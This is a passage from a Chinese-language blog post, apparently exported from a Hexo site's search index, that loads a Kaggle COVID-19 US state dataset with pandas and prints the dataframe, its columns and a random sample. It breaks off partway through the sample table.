<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>新冠肺炎COVID-19 State Data Set的简单分析与处理</title>
      <link href="/2020/04/26/%E6%96%B0%E5%86%A0%E8%82%BA%E7%82%8ECOVID-19%20State%20Data%20Set%E7%9A%84%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%84%E7%90%86/"/>
      <url>/2020/04/26/%E6%96%B0%E5%86%A0%E8%82%BA%E7%82%8ECOVID-19%20State%20Data%20Set%E7%9A%84%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%84%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>title: 【数据集分析】新冠肺炎COVID-19数据集简单分析与处理<br>date: 2020-4-26<br>tags:<br>    - python<br>    - 数据集<br>categories: [人工智能]</p><p>本文主要是：新冠肺炎COVID-19 State Data Set的简单分析与处理</p><a id="more"></a><h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h2><p>Use Pandas to load COVID-19 State Data Set as the dataframe.<br><strong><a href="https://pandas.pydata.org/" target="_blank" rel="noopener">Pandas</a></strong>  </p><p>由于数据持续更新,所以下载链接仅供参考，链接：<a href="https://pan.baidu.com/s/1npzHaEX5DUudB1yTTm8hyQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1npzHaEX5DUudB1yTTm8hyQ</a><br>提取码：qy8i</p><p>若需要请到此，下载最新数据<strong><a href="https://www.kaggle.com/nightranger77/covid19-state-data/data" target="_blank" rel="noopener">COVID-19 State Data Set</a></strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line">data = pd.read_csv(<span class="string">'COVID19_state.csv'</span>)</span><br><span class="line">df = pd.DataFrame(data)</span><br><span class="line">df</span><br></pre></td></tr></table></figure><div><style scoped>    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>State</th>      <th>Tested</th>      <th>Infected</th>      <th>Deaths</th>      <th>Population</th>      <th>Pop Density</th>      <th>Gini</th>      <th>ICU Beds</th>      <th>Income</th>      <th>GDP</th>      <th>...</th>      <th>Hospitals</th>      <th>Health Spending</th>      <th>Pollution</th>      <th>Med-Large Airports</th>      <th>Temperature</th>      <th>Urban</th>      <th>Age 0-25</th>      <th>Age 26-54</th>      <th>Age 55+</th>      <th>School Closure Date</th>    </tr>  </thead>  <tbody>    <tr>      <td>0</td>      <td>Alaska</td>      <td>9655</td>      <td>314</td>      <td>9</td>      <td>734002</td>      <td>1.2863</td>      <td>0.4081</td>      <td>119</td>      <td>59687</td>      <td>73205</td>      <td>...</td>      <td>21</td>      <td>11064</td>      <td>6.4</td>      <td>1.0</td>      <td>26.60</td>      <td>66.0</td>      <td>0.36</td>      <td>0.39</td>      <td>0.25</td>      <td>03/19/20</td>    </tr>    <tr>      <td>1</td>      <td>Alabama</td>      <td>42538</td>      <td>4723</td>      <td>151</td>      <td>4908621</td>      <td>96.9221</td>      <td>0.4847</td>      <td>1533</td>      <td>42334</td>      <td>45219</td>      <td>...</td>      <td>101</td>      <td>7281</td>      <td>8.1</td>      <td>1.0</td>      <td>62.80</td>      <td>59.0</td>      <td>0.33</td>      <td>0.37</td>      <td>0.31</td>      <td>03/16/20</td>    </tr>    <tr>      <td>2</td>      <td>Arkansas</td>      <td>24141</td>      <td>1739</td>      <td>38</td>      <td>3038999</td>      <td>58.4030</td>      <td>0.4719</td>      <td>732</td>      <td>42566</td>      <td>42454</td>      <td>...</td>      <td>88</td>      <td>7408</td>      <td>7.1</td>      <td>0.0</td>      <td>60.40</td>      <td>56.2</td>      <td>0.34</td>      <td>0.37</td>      <td>0.30</td>      <td>03/17/20</td>    </tr>    <tr>      <td>3</td>      <td>Arizona</td>      <td>51045</td>      <td>4719</td>      <td>177</td>      <td>7378494</td>      <td>64.9550</td>      <td>0.4713</td>      <td>1559</td>      <td>43650</td>      <td>48055</td>      <td>...</td>      <td>83</td>      <td>6452</td>      <td>9.7</td>      <td>1.0</td>      <td>60.30</td>      <td>89.8</td>      <td>0.33</td>      <td>0.36</td>      <td>0.30</td>      <td>03/16/20</td>    </tr>    <tr>      <td>4</td>      <td>California</td>      <td>266900</td>      <td>28963</td>      <td>1072</td>      <td>39937489</td>      <td>256.3727</td>      <td>0.4899</td>      <td>7338</td>      <td>62586</td>      <td>74205</td>      <td>...</td>      <td>359</td>      <td>7549</td>      <td>12.8</td>      <td>9.0</td>      <td>59.40</td>      <td>95.0</td>      <td>0.33</td>      <td>0.40</td>      <td>0.26</td>      <td>03/19/20</td>    </tr>    <tr>      <td>5</td>      <td>Colorado</td>      <td>44606</td>      <td>9433</td>      <td>411</td>      <td>5845526</td>      <td>56.4011</td>      <td>0.4586</td>      <td>1597</td>      <td>56846</td>      <td>63882</td>      <td>...</td>      <td>89</td>      <td>6804</td>      <td>6.7</td>      <td>1.0</td>      <td>45.10</td>      <td>86.2</td>      <td>0.33</td>      <td>0.40</td>      <td>0.27</td>      <td>03/23/20</td>    </tr>    <tr>      <td>6</td>      <td>Connecticut</td>      <td>58213</td>      <td>17550</td>      <td>1086</td>      <td>3563077</td>      <td>735.8689</td>      <td>0.4945</td>      <td>674</td>      <td>74561</td>      <td>76342</td>      <td>...</td>      <td>32</td>      <td>9859</td>      <td>7.2</td>      <td>1.0</td>      <td>49.00</td>      <td>88.0</td>      <td>0.30</td>      <td>0.38</td>      <td>0.32</td>      <td>03/17/20</td>    </tr>    <tr>      <td>7</td>      <td>District of Columbia</td>      <td>13268</td>      <td>2666</td>      <td>91</td>      <td>720687</td>      <td>11814.5410</td>      <td>0.5420</td>      <td>314</td>      <td>47285</td>      <td>200277</td>      <td>...</td>      <td>10</td>      <td>11944</td>      <td>9.8</td>      <td>0.0</td>      <td>54.65</td>      <td>100.0</td>      <td>0.30</td>      <td>0.48</td>      <td>0.22</td>      <td>03/16/20</td>    </tr>    <tr>      <td>8</td>      <td>Delaware</td>      <td>14794</td>      <td>2538</td>      <td>67</td>      <td>982895</td>      <td>504.3073</td>      <td>0.4522</td>      <td>186</td>      <td>51449</td>      <td>77253</td>      <td>...</td>      <td>7</td>      <td>10254</td>      <td>8.3</td>      <td>0.0</td>      <td>55.30</td>      <td>83.3</td>      <td>0.30</td>      <td>0.37</td>      <td>0.33</td>      <td>03/16/20</td>    </tr>    <tr>      <td>9</td>      <td>Florida</td>      <td>253183</td>      <td>25492</td>      <td>748</td>      <td>21992985</td>      <td>410.1256</td>      <td>0.4852</td>      <td>5604</td>      <td>49417</td>      <td>48318</td>      <td>...</td>      <td>217</td>      <td>8076</td>      <td>7.4</td>      <td>7.0</td>      <td>70.70</td>      <td>91.2</td>      <td>0.29</td>      <td>0.37</td>      <td>0.35</td>      <td>03/16/20</td>    </tr>    <tr>      <td>10</td>      <td>Georgia</td>      <td>74208</td>      <td>17841</td>      <td>677</td>      <td>10736059</td>      <td>186.6719</td>      <td>0.4813</td>      <td>2508</td>      <td>45745</td>      <td>55832</td>      <td>...</td>      <td>145</td>      <td>6587</td>      <td>8.3</td>      <td>1.0</td>      <td>63.50</td>      <td>75.1</td>      <td>0.35</td>      <td>0.39</td>      <td>0.26</td>      <td>03/18/20</td>    </tr>    <tr>      <td>11</td>      <td>Hawaii</td>      <td>23215</td>      <td>574</td>      <td>9</td>      <td>1412687</td>      <td>219.9419</td>      <td>0.4420</td>      <td>201</td>      <td>54565</td>      <td>64096</td>      <td>...</td>      <td>22</td>      <td>7299</td>      <td>5.4</td>      <td>2.0</td>      <td>70.00</td>      <td>91.9</td>      <td>0.30</td>      <td>0.37</td>      <td>0.32</td>      <td>03/23/20</td>    </tr>    <tr>      <td>12</td>      <td>Iowa</td>      <td>22947</td>      <td>2513</td>      <td>74</td>      <td>3179849</td>      <td>56.9284</td>      <td>0.4451</td>      <td>545</td>      <td>48823</td>      <td>59977</td>      <td>...</td>      <td>118</td>      <td>8200</td>      <td>7.1</td>      <td>0.0</td>      <td>47.80</td>      <td>64.0</td>      <td>0.34</td>      <td>0.36</td>      <td>0.30</td>      <td>NaN</td>    </tr>    <tr>      <td>13</td>      <td>Idaho</td>      <td>16869</td>      <td>1668</td>      <td>44</td>      <td>1826156</td>      <td>22.0969</td>      <td>0.4503</td>      <td>314</td>      <td>43155</td>      <td>43430</td>      <td>...</td>      <td>45</td>      <td>6927</td>      <td>6.8</td>      <td>0.0</td>      <td>44.40</td>      <td>70.6</td>      <td>0.36</td>      <td>0.36</td>      <td>0.28</td>      <td>03/23/20</td>    </tr>    <tr>      <td>14</td>      <td>Illinois</td>      <td>137404</td>      <td>29160</td>      <td>1259</td>      <td>12659682</td>      <td>228.0243</td>      <td>0.4810</td>      <td>3144</td>      <td>56933</td>      <td>67268</td>      <td>...</td>      <td>187</td>      <td>8262</td>      <td>9.3</td>      <td>2.0</td>      <td>51.80</td>      <td>88.5</td>      <td>0.33</td>      <td>0.38</td>      <td>0.28</td>      <td>03/17/20</td>    </tr>    <tr>      <td>15</td>      <td>Indiana</td>      <td>56873</td>      <td>10641</td>      <td>545</td>      <td>6745354</td>      <td>188.2810</td>      <td>0.4527</td>      <td>1861</td>      <td>46646</td>      <td>55172</td>      <td>...</td>      <td>132</td>      <td>8300</td>      <td>8.4</td>      <td>1.0</td>      <td>51.70</td>      <td>72.4</td>      <td>0.34</td>      <td>0.37</td>      <td>0.29</td>      <td>03/19/20</td>    </tr>    <tr>      <td>16</td>      <td>Kansas</td>      <td>17676</td>      <td>1790</td>      <td>86</td>      <td>2910357</td>      <td>35.5968</td>      <td>0.4550</td>      <td>767</td>      <td>50155</td>      <td>56334</td>      <td>...</td>      <td>139</td>      <td>7651</td>      <td>7.0</td>      <td>0.0</td>      <td>54.30</td>      <td>74.2</td>      <td>0.35</td>      <td>0.36</td>      <td>0.29</td>      <td>03/18/20</td>    </tr>    <tr>      <td>17</td>      <td>Kentucky</td>      <td>32225</td>      <td>2707</td>      <td>144</td>      <td>4499692</td>      <td>113.9566</td>      <td>0.4813</td>      <td>1392</td>      <td>41779</td>      <td>46898</td>      <td>...</td>      <td>105</td>      <td>8004</td>      <td>8.1</td>      <td>1.0</td>      <td>55.60</td>      <td>58.4</td>      <td>0.33</td>      <td>0.38</td>      <td>0.30</td>      <td>03/16/20</td>    </tr>    <tr>      <td>18</td>      <td>Louisiana</td>      <td>137999</td>      <td>23580</td>      <td>1267</td>      <td>4645184</td>      <td>107.5175</td>      <td>0.4990</td>      <td>1289</td>      <td>45542</td>      <td>53589</td>      <td>...</td>      <td>158</td>      <td>7815</td>      <td>7.9</td>      <td>1.0</td>      <td>66.40</td>      <td>73.2</td>      <td>0.34</td>      <td>0.37</td>      <td>0.28</td>      <td>03/16/20</td>    </tr>    <tr>      <td>19</td>      <td>Massachusetts</td>      <td>156806</td>      <td>36372</td>      <td>1560</td>      <td>6976597</td>      <td>894.4355</td>      <td>0.4786</td>      <td>1326</td>      <td>70073</td>      <td>82480</td>      <td>...</td>      <td>75</td>      <td>10559</td>      <td>6.3</td>      <td>1.0</td>      <td>47.90</td>      <td>92.0</td>      <td>0.30</td>      <td>0.39</td>      <td>0.31</td>      <td>03/17/20</td>    </tr>    <tr>      <td>20</td>      <td>Maryland</td>      <td>65370</td>      <td>12308</td>      <td>463</td>      <td>6083116</td>      <td>626.6731</td>      <td>0.4499</td>      <td>1134</td>      <td>62914</td>      <td>68573</td>      <td>...</td>      <td>50</td>      <td>8602</td>      <td>7.7</td>      <td>1.0</td>      <td>54.20</td>      <td>87.2</td>      <td>0.31</td>      <td>0.39</td>      <td>0.29</td>      <td>03/16/20</td>    </tr>    <tr>      <td>21</td>      <td>Maine</td>      <td>4241</td>      <td>847</td>      <td>32</td>      <td>1345790</td>      <td>43.6336</td>      <td>0.4519</td>      <td>256</td>      <td>48241</td>      <td>47969</td>      <td>...</td>      <td>34</td>      <td>9531</td>      <td>5.9</td>      <td>0.0</td>      <td>41.00</td>      <td>38.7</td>      <td>0.26</td>      <td>0.37</td>      <td>0.37</td>      <td>NaN</td>    </tr>    <tr>      <td>22</td>      <td>Michigan</td>      <td>107791</td>      <td>30791</td>      <td>2308</td>      <td>10045029</td>      <td>177.6655</td>      <td>0.4695</td>      <td>2423</td>      <td>47582</td>      <td>53209</td>      <td>...</td>      <td>144</td>      <td>8055</td>      <td>8.0</td>      <td>1.0</td>      <td>44.40</td>      <td>74.6</td>      <td>0.32</td>      <td>0.37</td>      <td>0.31</td>      <td>03/16/20</td>    </tr>    <tr>      <td>23</td>      <td>Minnesota</td>      <td>44368</td>      <td>2213</td>      <td>121</td>      <td>5700671</td>      <td>71.5922</td>      <td>0.4496</td>      <td>1171</td>      <td>56374</td>      <td>64675</td>      <td>...</td>      <td>127</td>      <td>8871</td>      <td>6.6</td>      <td>1.0</td>      <td>41.20</td>      <td>73.3</td>      <td>0.32</td>      <td>0.38</td>      <td>0.30</td>      <td>03/18/20</td>    </tr>    <tr>      <td>24</td>      <td>Missouri</td>      <td>53525</td>      <td>5517</td>      <td>175</td>      <td>6169270</td>      <td>89.7453</td>      <td>0.4646</td>      <td>1888</td>      <td>46635</td>      <td>51699</td>      <td>...</td>      <td>122</td>      <td>8107</td>      <td>7.5</td>      <td>2.0</td>      <td>54.60</td>      <td>70.4</td>      <td>0.33</td>      <td>0.37</td>      <td>0.31</td>      <td>03/19/20</td>    </tr>    <tr>      <td>25</td>      <td>Mississippi</td>      <td>37733</td>      <td>3974</td>      <td>152</td>      <td>2989260</td>      <td>63.7056</td>      <td>0.4828</td>      <td>824</td>      <td>37994</td>      <td>37948</td>      <td>...</td>      <td>99</td>      <td>7646</td>      <td>7.7</td>      <td>0.0</td>      <td>63.40</td>      <td>49.4</td>      <td>0.35</td>      <td>0.36</td>      <td>0.29</td>      <td>03/20/20</td>    </tr>    <tr>      <td>26</td>      <td>Montana</td>      <td>10569</td>      <td>426</td>      <td>10</td>      <td>1086759</td>      <td>7.4668</td>      <td>0.4667</td>      <td>165</td>      <td>47120</td>      <td>46609</td>      <td>...</td>      <td>56</td>      <td>8221</td>      <td>6.6</td>      <td>0.0</td>      <td>42.70</td>      <td>55.9</td>      <td>0.31</td>      <td>0.35</td>      <td>0.34</td>      <td>03/16/20</td>    </tr>    <tr>      <td>27</td>      <td>North Carolina</td>      <td>76211</td>      <td>6140</td>      <td>164</td>      <td>10611862</td>      <td>218.2702</td>      <td>0.4780</td>      <td>2227</td>      <td>45834</td>      <td>54441</td>      <td>...</td>      <td>112</td>      <td>7264</td>      <td>7.2</td>      <td>2.0</td>      <td>59.00</td>      <td>66.1</td>      <td>0.32</td>      <td>0.38</td>      <td>0.29</td>      <td>03/16/20</td>    </tr>    <tr>      <td>28</td>      <td>North Dakota</td>      <td>12963</td>      <td>528</td>      <td>9</td>      <td>761723</td>      <td>11.0393</td>      <td>0.4533</td>      <td>238</td>      <td>54306</td>      <td>72597</td>      <td>...</td>      <td>39</td>      <td>9851</td>      <td>4.6</td>      <td>0.0</td>      <td>40.40</td>      <td>59.9</td>      <td>0.35</td>      <td>0.37</td>      <td>0.28</td>      <td>03/16/20</td>    </tr>    <tr>      <td>29</td>      <td>Nebraska</td>      <td>13753</td>      <td>1138</td>      <td>24</td>      <td>1952570</td>      <td>25.4161</td>      <td>0.4477</td>      <td>440</td>      <td>52110</td>      <td>63942</td>      <td>...</td>      <td>93</td>      <td>8412</td>      <td>7.1</td>      <td>1.0</td>      <td>48.80</td>      <td>73.1</td>      <td>0.35</td>      <td>0.37</td>      <td>0.29</td>      <td>NaN</td>    </tr>    <tr>      <td>30</td>      <td>New Hampshire</td>      <td>13424</td>      <td>1342</td>      <td>38</td>      <td>1371246</td>      <td>153.1605</td>      <td>0.4304</td>      <td>242</td>      <td>61405</td>      <td>63067</td>      <td>...</td>      <td>28</td>      <td>9589</td>      <td>4.4</td>      <td>0.0</td>      <td>43.80</td>      <td>60.3</td>      <td>0.28</td>      <td>0.37</td>      <td>0.34</td>      <td>03/16/20</td>    </tr>    <tr>      <td>31</td>      <td>New Jersey</td>      <td>162536</td>      <td>81420</td>      <td>4070</td>      <td>8936574</td>      <td>1215.1991</td>      <td>0.4813</td>      <td>1822</td>      <td>67609</td>      <td>69378</td>      <td>...</td>      <td>82</td>      <td>8859</td>      <td>8.1</td>      <td>1.0</td>      <td>52.70</td>      <td>94.7</td>      <td>0.31</td>      <td>0.38</td>      <td>0.30</td>      <td>03/18/20</td>    </tr>    <tr>      <td>32</td>      <td>New Mexico</td>      <td>36632</td>      <td>1798</td>      <td>51</td>      <td>2096640</td>      <td>17.2850</td>      <td>0.4769</td>      <td>340</td>      <td>41198</td>      <td>46954</td>      <td>...</td>      <td>41</td>      <td>7214</td>      <td>6.0</td>      <td>1.0</td>      <td>53.40</td>      <td>77.4</td>      <td>0.33</td>      <td>0.36</td>      <td>0.31</td>      <td>03/16/20</td>    </tr>    <tr>      <td>33</td>      <td>Nevada</td>      <td>30751</td>      <td>3626</td>      <td>155</td>      <td>3139658</td>      <td>28.5993</td>      <td>0.4577</td>      <td>900</td>      <td>48225</td>      <td>55269</td>      <td>...</td>      <td>44</td>      <td>6714</td>      <td>9.0</td>      <td>1.0</td>      <td>49.90</td>      <td>94.2</td>      <td>0.32</td>      <td>0.40</td>      <td>0.29</td>      <td>03/16/20</td>    </tr>    <tr>      <td>34</td>      <td>New York</td>      <td>596532</td>      <td>236732</td>      <td>12192</td>      <td>19440469</td>      <td>412.5211</td>      <td>0.5229</td>      <td>3952</td>      <td>68667</td>      <td>85746</td>      <td>...</td>      <td>166</td>      <td>9778</td>      <td>6.6</td>      <td>3.0</td>      <td>45.40</td>      <td>87.9</td>      <td>0.31</td>      <td>0.39</td>      <td>0.30</td>      <td>03/18/20</td>    </tr>    <tr>      <td>35</td>      <td>Ohio</td>      <td>83131</td>      <td>10222</td>      <td>451</td>      <td>11747694</td>      <td>287.5038</td>      <td>0.4680</td>      <td>3314</td>      <td>48242</td>      <td>57492</td>      <td>...</td>      <td>194</td>      <td>8712</td>      <td>8.5</td>      <td>3.0</td>      <td>50.70</td>      <td>77.9</td>      <td>0.32</td>      <td>0.37</td>      <td>0.31</td>      <td>03/17/20</td>    </tr>    <tr>      <td>36</td>      <td>Oklahoma</td>      <td>35561</td>      <td>2465</td>      <td>136</td>      <td>3954821</td>      <td>57.6547</td>      <td>0.4645</td>      <td>1064</td>      <td>46128</td>      <td>50613</td>      <td>...</td>      <td>125</td>      <td>7627</td>      <td>8.2</td>      <td>0.0</td>      <td>59.60</td>      <td>66.2</td>      <td>0.35</td>      <td>0.37</td>      <td>0.29</td>      <td>03/17/20</td>    </tr>    <tr>      <td>37</td>      <td>Oregon</td>      <td>37583</td>      <td>1844</td>      <td>72</td>      <td>4301089</td>      <td>44.8086</td>      <td>0.4583</td>      <td>659</td>      <td>49908</td>      <td>56956</td>      <td>...</td>      <td>61</td>      <td>8044</td>      <td>7.8</td>      <td>1.0</td>      <td>48.40</td>      <td>81.0</td>      <td>0.30</td>      <td>0.39</td>      <td>0.31</td>      <td>03/16/20</td>    </tr>    <tr>      <td>38</td>      <td>Pennsylvania</td>      <td>153965</td>      <td>31069</td>      <td>836</td>      <td>12820878</td>      <td>286.5449</td>      <td>0.4689</td>      <td>3169</td>      <td>55349</td>      <td>61594</td>      <td>...</td>      <td>199</td>      <td>9258</td>      <td>9.2</td>      <td>2.0</td>      <td>48.80</td>      <td>78.7</td>      <td>0.30</td>      <td>0.37</td>      <td>0.32</td>      <td>03/16/20</td>    </tr>    <tr>      <td>39</td>      <td>Rhode Island</td>      <td>10933</td>      <td>1118</td>      <td>60</td>      <td>1056161</td>      <td>1021.4323</td>      <td>0.4781</td>      <td>279</td>      <td>54523</td>      <td>57852</td>      <td>...</td>      <td>11</td>      <td>9551</td>      <td>7.3</td>      <td>0.0</td>      <td>50.10</td>      <td>90.7</td>      <td>0.29</td>      <td>0.39</td>      <td>0.32</td>      <td>03/16/20</td>    </tr>    <tr>      <td>40</td>      <td>South Carolina</td>      <td>32826</td>      <td>4491</td>      <td>137</td>      <td>5210095</td>      <td>173.3174</td>      <td>0.4735</td>      <td>1225</td>      <td>42736</td>      <td>45280</td>      <td>...</td>      <td>69</td>      <td>7311</td>      <td>7.4</td>      <td>0.0</td>      <td>62.40</td>      <td>66.3</td>      <td>0.32</td>      <td>0.36</td>      <td>0.32</td>      <td>03/16/20</td>    </tr>    <tr>      <td>41</td>      <td>South Dakota</td>      <td>38833</td>      <td>4246</td>      <td>119</td>      <td>903027</td>      <td>11.9116</td>      <td>0.4495</td>      <td>152</td>      <td>50141</td>      <td>58624</td>      <td>...</td>      <td>57</td>      <td>8933</td>      <td>5.1</td>      <td>0.0</td>      <td>45.20</td>      <td>56.7</td>      <td>0.35</td>      <td>0.35</td>      <td>0.30</td>      <td>03/16/20</td>    </tr>    <tr>      <td>42</td>      <td>Tennessee</td>      <td>11661</td>      <td>1542</td>      <td>7</td>      <td>6897576</td>      <td>167.2748</td>      <td>0.4790</td>      <td>2209</td>      <td>47179</td>      <td>53933</td>      <td>...</td>      <td>115</td>      <td>7372</td>      <td>7.4</td>      <td>1.0</td>      <td>57.60</td>      <td>66.4</td>      <td>0.33</td>      <td>0.38</td>      <td>0.29</td>      <td>03/20/20</td>    </tr>    <tr>      <td>43</td>      <td>Texas</td>      <td>90586</td>      <td>6762</td>      <td>145</td>      <td>29472295</td>      <td>112.8204</td>      <td>0.4800</td>      <td>6199</td>      <td>49161</td>      <td>61167</td>      <td>...</td>      <td>523</td>      <td>6998</td>      <td>8.3</td>      <td>6.0</td>      <td>64.80</td>      <td>84.7</td>      <td>0.36</td>      <td>0.39</td>      <td>0.24</td>      <td>03/23/20</td>    </tr>    <tr>      <td>44</td>      <td>Utah</td>      <td>176239</td>      <td>18260</td>      <td>453</td>      <td>3282115</td>      <td>39.9430</td>      <td>0.4063</td>      <td>565</td>      <td>45340</td>      <td>55550</td>      <td>...</td>      <td>54</td>      <td>5982</td>      <td>8.4</td>      <td>1.0</td>      <td>48.60</td>      <td>90.6</td>      <td>0.42</td>      <td>0.37</td>      <td>0.21</td>      <td>03/16/20</td>    </tr>    <tr>      <td>45</td>      <td>Virginia</td>      <td>59944</td>      <td>2931</td>      <td>25</td>      <td>8626207</td>      <td>218.4403</td>      <td>0.4705</td>      <td>1654</td>      <td>56952</td>      <td>62563</td>      <td>...</td>      <td>96</td>      <td>7556</td>      <td>6.9</td>      <td>2.0</td>      <td>55.10</td>      <td>75.5</td>      <td>0.33</td>      <td>0.38</td>      <td>0.29</td>      <td>03/16/20</td>    </tr>    <tr>      <td>46</td>      <td>Vermont</td>      <td>51931</td>      <td>8053</td>      <td>258</td>      <td>628061</td>      <td>68.1416</td>      <td>0.4539</td>      <td>94</td>      <td>53598</td>      <td>53523</td>      <td>...</td>      <td>14</td>      <td>10190</td>      <td>5.1</td>      <td>0.0</td>      <td>42.90</td>      <td>38.9</td>      <td>0.27</td>      <td>0.36</td>      <td>0.36</td>      <td>03/18/20</td>    </tr>    <tr>      <td>47</td>      <td>Washington</td>      <td>12116</td>      <td>779</td>      <td>35</td>      <td>7797095</td>      <td>117.3272</td>      <td>0.4591</td>      <td>1265</td>      <td>60781</td>      <td>74182</td>      <td>...</td>      <td>92</td>      <td>7913</td>      <td>8.0</td>      <td>1.0</td>      <td>48.30</td>      <td>84.1</td>      <td>0.31</td>      <td>0.40</td>      <td>0.29</td>      <td>03/17/20</td>    </tr>    <tr>      <td>48</td>      <td>Wisconsin</td>      <td>131984</td>      <td>11802</td>      <td>624</td>      <td>5851754</td>      <td>108.0497</td>      <td>0.4498</td>      <td>1159</td>      <td>50756</td>      <td>57720</td>      <td>...</td>      <td>133</td>      <td>8702</td>      <td>6.8</td>      <td>1.0</td>      <td>43.10</td>      <td>70.2</td>      <td>0.32</td>      <td>0.37</td>      <td>0.31</td>      <td>03/18/20</td>    </tr>    <tr>      <td>49</td>      <td>West Virginia</td>      <td>48161</td>      <td>4199</td>      <td>211</td>      <td>1778070</td>      <td>73.9691</td>      <td>0.4711</td>      <td>653</td>      <td>40578</td>      <td>43053</td>      <td>...</td>      <td>56</td>      <td>9462</td>      <td>7.6</td>      <td>0.0</td>      <td>51.80</td>      <td>48.7</td>      <td>0.29</td>      <td>0.36</td>      <td>0.35</td>      <td>03/16/20</td>    </tr>    <tr>      <td>50</td>      <td>Wyoming</td>      <td>19794</td>      <td>825</td>      <td>18</td>      <td>567025</td>      <td>5.8400</td>      <td>0.4360</td>      <td>102</td>      <td>60095</td>      <td>69900</td>      <td>...</td>      <td>29</td>      <td>8320</td>      <td>5.0</td>      <td>0.0</td>      <td>42.00</td>      <td>64.8</td>      <td>0.32</td>      <td>0.36</td>      <td>0.31</td>      <td>03/20/20</td>    </tr>  </tbody></table><p>51 rows × 26 columns</p></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df.keys()</span><br></pre></td></tr></table></figure><pre><code>Index([&apos;State&apos;, &apos;Tested&apos;, &apos;Infected&apos;, &apos;Deaths&apos;, &apos;Population&apos;, &apos;Pop Density&apos;,       &apos;Gini&apos;, &apos;ICU Beds&apos;, &apos;Income&apos;, &apos;GDP&apos;, &apos;Unemployment&apos;, &apos;Sex Ratio&apos;,       &apos;Smoking Rate&apos;, &apos;Flu Deaths&apos;, &apos;Respiratory Deaths&apos;, &apos;Physicians&apos;,       &apos;Hospitals&apos;, &apos;Health Spending&apos;, &apos;Pollution&apos;, &apos;Med-Large Airports&apos;,       &apos;Temperature&apos;, &apos;Urban&apos;, &apos;Age 0-25&apos;, &apos;Age 26-54&apos;, &apos;Age 55+&apos;,       &apos;School Closure Date&apos;],      dtype=&apos;object&apos;)</code></pre><h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h2><p> Get 20 data items as sample randomly and show them.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">df1 = df.sample(frac=<span class="number">0.4</span>)</span><br><span class="line">df1</span><br></pre></td></tr></table></figure><div><style scoped>    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>State</th>      <th>Tested</th>      <th>Infected</th>      <th>Deaths</th>      <th>Population</th>      <th>Pop Density</th>      <th>Gini</th>      <th>ICU Beds</th>      <th>Income</th>      <th>GDP</th>      <th>...</th>      <th>Hospitals</th>      <th>Health Spending</th>      <th>Pollution</th>      <th>Med-Large Airports</th>      <th>Temperature</th>      <th>Urban</th>      <th>Age 0-25</th>      <th>Age 26-54</th>      <th>Age 55+</th>      <th>School Closure Date</th>    </tr>  </thead>  <tbody>    <tr>      <td>26</td>      <td>Montana</td>      <td>10569</td>      <td>426</td>      <td>10</td>      <td>1086759</td>      <td>7.4668</td>      <td>0.4667</td>      <td>165</td>      <td>47120</td>      <td>46609</td>      <td>...</td>      <td>56</td>      <td>8221</td>      <td>6.6</td>      <td>0.0</td>      <td>42.7</td>      <td>55.9</td>      <td>0.31</td>      <td>0.35</td>      <td>0.34</td>      <td>03/16/20</td>    </tr>    <tr>      <td>22</td>      <td>Michigan</td>      <td>107791</td>      <td>30791</td>      <td>2308</td>      <td>10045029</td>      <td>177.6655</td>      <td>0.4695</td>      <td>2423</td>      <td>47582</td>      <td>53209</td>      <td>...</td>      <td>144</td>      <td>8055</td>      <td>8.0</td>      <td>1.0</td>      <td>44.4</td>      <td>74.6</td>      <td>0.32</td>      <td>0.37</td>      <td>0.31</td>      <td>03/16/20</td>    </tr>    <tr>      <td>15</td>      <td>Indiana</td>      <td>56873</td>      <td>10641</td>      <td>545</td>      <td>6745354</td>      <td>188.2810</td>      <td>0.4527</td>      <td>1861</td>      <td>46646</td>      <td>55172</td>      <td>...</td>      <td>132</td>      <td>8300</td>      <td>8.4</td>      <td>1.0</td>      <td>51.7</td>      <td>72.4</td>      <td>0.34</td>      <td>0.37</td>      <td>0.29</td>      <td>03/19/20</td>    </tr>    <tr>      <td>11</td>      <td>Hawaii</td>      <td>23215</td>      <td>574</td>      <td>9</td>      <td>1412687</td>      <td>219.9419</td>      <td>0.4420</td>      <td>201</td>      <td>54565</td>      <td>64096</td>      <td>...</td>      <td>22</td>      <td>7299</td>      <td>5.4</td>      <td>2.0</td>      <td>70.0</td>      <td>91.9</td>      <td>0.30</td>      <td>0.37</td>      <td>0.32</td>      <td>03/23/20</td>    </tr>    <tr>      <td>14</td>      <td>Illinois</td>      <td>137404</td>      <td>29160</td>      <td>1259</td>      <td>12659682</td>      <td>228.0243</td>      <td>0.4810</td>      <td>3144</td>      <td>56933</td>      <td>67268</td>      <td>...</td>      <td>187</td>      <td>8262</td>      <td>9.3</td>      <td>2.0</td>      <td>51.8</td>      <td>88.5</td>      <td>0.33</td>      <td>0.38</td>      <td>0.28</td>      <td>03/17/20</td>    </tr>    <tr>      <td>6</td>      <td>Connecticut</td>      <td>58213</td>      <td>17550</td>      <td>1086</td>      <td>3563077</td>      <td>735.8689</td>      <td>0.4945</td>      <td>674</td>      <td>74561</td>      <td>76342</td>      <td>...</td>      <td>32</td>      <td>9859</td>      <td>7.2</td>      <td>1.0</td>      <td>49.0</td>      <td>88.0</td> 